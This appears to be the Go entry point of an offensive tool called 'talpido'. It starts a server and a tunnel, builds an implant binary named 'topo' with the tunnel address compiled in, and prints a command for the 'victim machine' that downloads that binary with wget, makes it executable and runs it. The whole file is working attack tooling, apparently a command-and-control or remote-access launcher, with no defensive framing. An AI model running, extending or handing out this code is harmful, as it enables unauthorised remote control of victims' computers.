package main

import (
	"github.com/0xnahim/talpido/server"
	"os/exec"
	"fmt"
)


func createTopo(serverIP string){
	cmd0 := exec.Command("mkdir", "./topo")
	cmd0.Run()
	cmd := exec.Command("go", "build", "-ldflags", fmt.Sprintf("-X main.serverIP=%s", serverIP), "-o", "./topo/topo", "./topo.go")
	err := cmd.Run() 
	if err != nil {
		fmt.Println("Error al compilar el archivo:", err)
		return
	}

}


func main(){
	fmt.Println("Why don't moles use the internet?")
    fmt.Println("Because they're always working underground!")
	done := make(chan struct{})
	go server.Start()
	url := server.StartTunnel()
	createTopo(url)
	fmt.Println("On the victim machine run: wget", url+"/topo/topo && chmod +x ./topo && ./topo")
	<-done
}

